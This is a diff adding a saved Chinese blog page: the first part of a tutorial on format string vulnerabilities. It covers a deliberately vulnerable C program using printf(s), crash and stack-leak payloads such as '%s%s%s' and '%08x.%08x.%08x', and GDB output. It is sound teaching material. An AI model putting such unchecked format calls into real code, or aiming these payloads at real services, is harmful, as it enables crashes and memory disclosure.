@@ -1,0 +1,2541 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="一步一步学pwn|格式化字符串(1), All fine">
+    <meta name="description" content="格式化字符串漏洞原理介绍首先，对格式化字符串漏洞的原理进行简单介绍。
+格式化字符串函数介绍格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>一步一步学pwn|格式化字符串(1) | Kni9hT&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Kni9hT's Blog" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/match.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Kni9hT's Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/match.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Kni9hT's Blog</div>
+        <div class="logo-desc">
+            
+            JNU|ISSC|IS
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/littlematch59" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/littlematch59" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">一步一步学pwn|格式化字符串(1)</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/format-string/">
+                                <span class="chip bg-color">format string</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/pwn/" class="post-category">
+                                pwn
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-05-19
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    12.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    56 分
+                </div>
+                
+				
+                
+            </div>
+            
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="格式化字符串漏洞原理介绍"><a href="#格式化字符串漏洞原理介绍" class="headerlink" title="格式化字符串漏洞原理介绍"></a>格式化字符串漏洞原理介绍</h1><p>首先，对格式化字符串漏洞的原理进行简单介绍。</p>
+<h2 id="格式化字符串函数介绍"><a href="#格式化字符串函数介绍" class="headerlink" title="格式化字符串函数介绍"></a>格式化字符串函数介绍</h2><p>格式化字符串函数可以接受可变数量的参数，<strong>并将第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的C/C++程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分：</p>
+<ul>
+<li>格式化字符串函数</li>
+<li>格式化字符串</li>
+<li>后续参数(可选)</li>
+</ul>
+<p>以printf函数举例：</p>
+<p><img src="https://img-blog.csdnimg.cn/20200519002938310.jpg" alt="在这里插入图片描述"></p>
+<h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><p>常见的格式化字符串函数有：</p>
+<ul>
+<li><p>输入</p>
+<ul>
+<li>scanf</li>
+</ul>
+</li>
+<li><p>输出</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">基本介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">printf</td>
+<td align="center">输出到stdout</td>
+</tr>
+<tr>
+<td align="center">fprintf</td>
+<td align="center">输出到指定FILE流</td>
+</tr>
+<tr>
+<td align="center">vpirntf</td>
+<td align="center">根据参数列表格式化输出到stdout</td>
+</tr>
+<tr>
+<td align="center">vfprintf</td>
+<td align="center">根据参数列表格式化输出到指定FILE流</td>
+</tr>
+<tr>
+<td align="center">sprintf</td>
+<td align="center">输出到字符串</td>
+</tr>
+<tr>
+<td align="center">snprintf</td>
+<td align="center">输出指定字节数到字符串</td>
+</tr>
+<tr>
+<td align="center">vsprintf</td>
+<td align="center">根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td align="center">vsnprintf</td>
+<td align="center">根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td align="center">setproctitle</td>
+<td align="center">设置argv</td>
+</tr>
+<tr>
+<td align="center">syslog</td>
+<td align="center">输出日志</td>
+</tr>
+<tr>
+<td align="center">err,verr,warn,vwarn等</td>
+<td align="center">…</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>格式化字符串的基本格式如下：</p>
+<pre><code>%[parameter][flags][field width][.precision][length]type</code></pre><p><a href="[https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2](https://zh.wikipedia.org/wiki/格式化字符串)">format string-Wikipedia</a></p>
+<ul>
+<li><p>parameter(可选)</p>
+<ul>
+<li>n$,获取格式化字符串中的第n个参数</li>
+</ul>
+</li>
+<li><p>flags(可为0个或多个)</p>
+<table>
+<thead>
+<tr>
+<th align="center">字符</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">+</td>
+<td align="center">总是表示有符号数值的’+’或’-‘号，缺省情况是忽略正数的符号。仅适用于数值类型。</td>
+</tr>
+<tr>
+<td align="center">空格</td>
+<td align="center">使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与’+’同时出现，则空格说明符被忽略。</td>
+</tr>
+<tr>
+<td align="center">-</td>
+<td align="center">左对齐。缺省情况是右对齐。</td>
+</tr>
+<tr>
+<td align="center">#</td>
+<td align="center">对于’g’与’G’,不删除尾部0以表示精度。对于’f’,’F’,’e’,’E’,’g’,’G’,总是输出小数点。对于’o’,’x’,’X’,在非0数值前分别输出前缀0,0x,and 0X表示数制。</td>
+</tr>
+<tr>
+<td align="center">0</td>
+<td align="center">如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。例如<code>printf("%2d", 3)</code>输出”<code>3</code>“，而<code>printf("%02d", 3)</code>输出”<code>03</code>“。如果<code>0</code>与<code>-</code>均出现，则<code>0</code>被忽略，即左对齐依然用空格填充。</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>field width</p>
+<ul>
+<li>输出的最小宽度</li>
+</ul>
+</li>
+<li><p>precision</p>
+<ul>
+<li>输出的最大长度</li>
+</ul>
+</li>
+<li><p>length,输出的长度</p>
+<ul>
+<li>hh,输出一个字节</li>
+<li>h，输出一个双字节</li>
+</ul>
+</li>
+<li><p>type</p>
+<ul>
+<li>d/i,有符号整数</li>
+<li>u,无符号整数</li>
+<li>x/X,16进制unsigned int。x使用小写字母;X使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1.精度为0且值为0，则输出为空。</li>
+<li>o，8进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0.默认精度为1.精度为0且值为0，则输出为空。</li>
+<li>s，如果没有用l标志，输出null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb函数。</li>
+<li>c，如果没有用l标志，把int参数转为unsigned char型输出；如果用了l标志，把wint_t参数转为包含两个元素的wchart_t数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。</li>
+<li>p,void *型，输出对应变量的值。printf(“%p”,a)用地址的格式打印变量a的值，printf(“%p”,&amp;a)打印变量a所在的地址。</li>
+<li>n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li>
+<li>%，’%’字面值，不接受任何flags,width。</li>
+</ul>
+</li>
+</ul>
+<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>即相应的要输出的变量。</p>
+<h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>上面说到，格式化字符串函数是根据格式化字符串函数来进行解析的。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。</strong>比如说’%s’表明我们会输出一个字符串参数。</p>
+<p>我们继续以上面的为例子进行介绍</p>
+<p><img src="https://img-blog.csdnimg.cn/2020051900301089.jpg" alt="在这里插入图片描述"></p>
+<p>对于这样的例子，在进入printf函数之前(即还没有调用printf函数)，栈上的布局由高地址到低地址依次为：</p>
+<pre><code>some value    #假设为某个未知的值
+3.14
+123456
+addr of "red"
+addr of format string: Color %s...</code></pre><p>在进入printf之后，函数首先获取第一个参数，一个一个读取其字符串会遇到两种情况：</p>
+<ul>
+<li>当前字符不是 %，直接输出到相应标准输出。</li>
+<li>当前字符是%，继续读取下一个字符<ul>
+<li>如果没有字符，报错</li>
+<li>如果下一个字符是%，输出%</li>
+<li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li>
+</ul>
+</li>
+</ul>
+<p>假设在编写程序的时候，写成了下面的样子</p>
+<pre><code>printf("Color %s,Number %d,Float %4.2f");</code></pre><blockquote>
+<p>即没有提供参数，程序应该如何运行？</p>
+</blockquote>
+<p>程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p>
+<ul>
+<li>1.解析其地址对应的字符串</li>
+<li>2.解析其内容对应的整型值</li>
+<li>3.解析其内容对应的浮点值</li>
+</ul>
+<p>对于2,3来说倒还无妨，但是对于1来说，如果提供了一个不可访问地址，比如0，那么程序就会因此而崩溃。</p>
+<p>这基本就是格式化字符串漏洞的基本原理了。</p>
+<hr>
+<h1 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h1><p>其实，在上一部分，我们展示了格式化字符串漏洞的两个利用手段</p>
+<ul>
+<li>使程序崩溃，因为%s对应的参数地址不合法的概率比较大。</li>
+<li>查看进程内容，根据%d，%f输出了栈上的内容。</li>
+</ul>
+<p>下面我们会对于每一方面进行更加详细的解释。</p>
+<h2 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h2><p>通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们值需要输入若干个%s即可</p>
+<pre><code>%s%s%s%s%s%s%s%s%s%s%s%s%s%s</code></pre><p>这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。</p>
+<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用格式化字符串的漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作：</p>
+<ul>
+<li>泄露栈内存<ul>
+<li>获取某个变量的值</li>
+<li>获取某个变量对应地址的内存</li>
+</ul>
+</li>
+<li>泄露任意地址内存<ul>
+<li>利用GOT表得到libc函数地址，进而获取libc，进而获取其它libc函数地址</li>
+<li>盲打，dump整个程序，获取有用信息</li>
+</ul>
+</li>
+</ul>
+<h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>例如，给定如下程序</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后编译，</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c 
+In file included from /usr/include/stdio.h:27:0,
+                 from leakmemory.c:1:
+/usr/include/features.h:367:25: fatal error: sys/cdefs.h: No such file or directory
+compilation terminated.
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这是什么奇怪的报错啊…</p>
+<pre class="line-numbers language-c"><code class="language-c">devil@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span>$ gcc <span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector <span class="token operator">-</span>no<span class="token operator">-</span>pie <span class="token operator">-</span>o leakmemory leakmemory<span class="token punctuation">.</span>cleakmemory<span class="token punctuation">.</span>c<span class="token punctuation">:</span> In function ‘main’<span class="token punctuation">:</span>
+leakmemory<span class="token punctuation">.</span>c<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span> warning<span class="token punctuation">:</span> format not a string literal and no format arguments <span class="token punctuation">[</span><span class="token operator">-</span>Wformat<span class="token operator">-</span>security<span class="token punctuation">]</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>把-m32去掉就好了。</p>
+<p>可以看出，编译器指出了我们的程序中没有给出格式化字符串的参数问题。下面我们来看一下如何获取对应的栈内存。</p>
+<p>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p>
+<h5 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h5><p>首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下…</p>
+<p>结果是运行没反应，考虑到可能是-m32参数没加的原因，上网查了之前的报错，可能是libc的库有问题。</p>
+<pre class="line-numbers language-shell"><code class="language-shell">sudo apt-get purge libc6-dev
+sudo apt-get install libc6-dev
+sudo apt-get install libc6-dev-i386<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/2020051900303830.jpg" alt="在这里插入图片描述"></p>
+<p>运行还是没反应…我突然发现原来程序要先输入…WSSB</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ ./leakmemory 
+%08x.%08x.%08x
+00000001.22222222.ffffffff.%08x.%08x.%08x
+ffab5f48.f7f07918.00f0b5ff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用 GDB 来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。</p>
+<p>首先，启动程序，将断点下载 printf 函数处</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb leakmemory 
+gef➤  b printf
+Breakpoint 1 at 0x8048370<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell"><code class="language-shell">gef➤  r
+Starting program: /home/devil/leakmemory 
+%08x.%08x.%08x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>敲击回车，程序继续运行，可以看出程序首先断在了第一次调用printf函数的位置</p>
+<pre class="line-numbers language-assembly"><code class="language-assembly">Breakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:28
+28    printf.c: No such file or directory.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffd008  →  "%08x.%08x.%08x"
+$ebx   : 0x0       
+$ecx   : 0x1       
+$edx   : 0xf7fb787c  →  0x00000000
+$esp   : 0xffffcfcc  →  0x0804851d  →  <main+98> add esp, 0x20
+$ebp   : 0xffffd078  →  0x00000000
+$esi   : 0xf7fb6000  →  0x001b1db0
+$edi   : 0xf7fb6000  →  0x001b1db0
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
+$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xffffcfcc│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp
+0xffffcfd0│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"
+0xffffcfd4│+0x0008: 0x00000001
+0xffffcfd8│+0x000c: 0x22222222
+0xffffcfdc│+0x0010: 0xffffffff
+0xffffcfe0│+0x0014: 0xffffd008  →  "%08x.%08x.%08x"
+0xffffcfe4│+0x0018: 0xffffd008  →  "%08x.%08x.%08x"
+0xffffcfe8│+0x001c: 0xf7ffd918  →  0x00000000
+─────────────────────────────────────────────────────────────── code:x86:32 ────
+   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
+   0xf7e4d66d                  nop    
+   0xf7e4d66e                  xchg   ax, ax
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
+─────────────────────────────────────────────────────── arguments (guessed) ────
+__x86.get_pc_thunk.ax (
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0xf7e4d670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")
+[#1] 0x804851d → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
